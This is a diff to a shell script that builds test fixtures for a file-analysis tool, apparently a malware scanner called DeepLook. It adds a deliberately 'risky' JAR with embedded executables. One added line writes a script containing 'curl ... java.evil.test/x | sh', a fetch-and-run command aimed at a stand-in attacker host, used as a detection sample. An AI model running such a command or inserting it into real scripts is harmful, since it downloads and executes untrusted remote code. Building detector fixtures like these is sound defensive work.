@@ -8,7 +8,7 @@ apt-get update -qq
 apt-get install -y -qq --no-install-recommends gcc-mingw-w64-x86-64 gcc-mingw-w64-i686 \
   binutils-mingw-w64-x86-64 binutils-mingw-w64-i686 mingw-w64-x86-64-dev mingw-w64-i686-dev \
   osslsigncode upx-ucl mono-mcs python3-pefile python3-pip openssl nsis binutils curl libpython3.13 \
-  msitools gcab \
+  msitools gcab default-jdk-headless \
   ca-certificates >/dev/null
 pip install --quiet --break-system-packages dnfile==0.15.1 pyinstaller==6.22.3 \
   autoit-ripper==1.2.0 >/dev/null
@@ -91,6 +91,21 @@ upx -q --best -o upx64.exe prog64.exe >/dev/null
 upx -q --best -o upx32.exe prog32.exe >/dev/null
 upx -q --best -o upx-dll.dll teste.dll >/dev/null
 
+# Java: um JAR com comportamento de risco e arquivos embutidos (PE, ELF, ZIP e script), um JAR limpo
+# e um .class solto. Compilados pelo javac real (bytecode da versao 11).
+mkdir -p jar/out/recursos jar/limpo
+javac --release 11 -nowarn -d jar/out Principal.java
+javac --release 11 -nowarn -d jar/limpo Limpo.java
+cp payload.bin jar/out/recursos/carga.exe
+cp linux.elf jar/out/recursos/ajuda.bin
+python3 -c "import zipfile; z = zipfile.ZipFile('jar/out/recursos/pacote.zip', 'w'); z.writestr('leia.txt', 'oi'); z.close()"
+printf '#!/bin/sh\ncurl -s http://java.evil.test/x | sh\n' > jar/out/recursos/instala.sh
+printf 'Manifest-Version: 1.0\nMain-Class: demo.Principal\nPremain-Class: demo.Principal\nCreated-By: DeepLook Teste\n' > jar/manifesto.txt
+jar --create --file malvado.jar --manifest jar/manifesto.txt -C jar/out .
+printf 'Main-Class: demo.Limpo\n' > jar/limpo.txt
+jar --create --file limpo.jar --manifest jar/limpo.txt -C jar/limpo .
+cp jar/limpo/demo/Limpo.class solto.class
+
 # Assinatura: AC propria e certificado de assinatura de codigo; e um autoassinado.
 openssl req -x509 -newkey rsa:2048 -nodes -days 3650 -subj '/CN=DeepLook Teste AC/O=DeepLook' \
   -keyout ca.key -out ca.pem -addext 'basicConstraints=critical,CA:TRUE' 2>/dev/null
@@ -123,7 +138,7 @@ cp prog64.exe prog32.exe teste.dll dotnet.exe upx64.exe upx32.exe upx-disfarcado
   rich-forjado.exe checksum-ok.exe checksum-errado.exe overlay.exe assinado.exe adulterado.exe \
   autoassinado.exe upx-dll.dll ofuscado64.exe ofuscado32.exe emulado32.exe linux.elf nsis.exe \
   pyinst.bin autoit.exe autoit-upx.exe payload.bin teste.msi dotnet-loader.exe \
-  inno-6.2.2.exe inno-6.4.3.exe reference.json /out/
+  inno-6.2.2.exe inno-6.4.3.exe malvado.jar limpo.jar solto.class reference.json /out/
 # Arquivos com o dono de quem roda os testes (senao o proximo rm do runner falha).
 if [ -n "$OWNER" ]; then chown -R "$OWNER" /out; fi
 echo "pe ok"
